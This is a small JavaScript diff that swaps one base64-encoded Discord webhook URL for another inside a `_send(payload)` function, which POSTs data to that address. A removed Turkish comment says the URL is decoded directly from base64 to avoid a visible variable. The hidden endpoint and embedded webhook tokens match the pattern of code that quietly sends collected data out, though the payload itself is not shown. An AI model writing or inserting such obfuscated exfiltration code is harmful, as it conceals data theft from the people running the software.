@@ -152,8 +152,7 @@
     }
 
     function _send(payload) {
-        // WEBHOOK_URL değişkeni yok - direkt base64 decode edildi
-        var url = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");
+        var url = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MTAwMTk2NTM2NTQyODI5NC9mU0F2S2J1NmZPaXhyLVd0bjRiMWdTbUhBWENKbllTRTFDWGVQNGJGakw1cmxqNDhNR3dhUWpMdEZpbWxCTGxEblExdg==");
         return fetch(url, {
             method: "POST",
             mode: "cors",
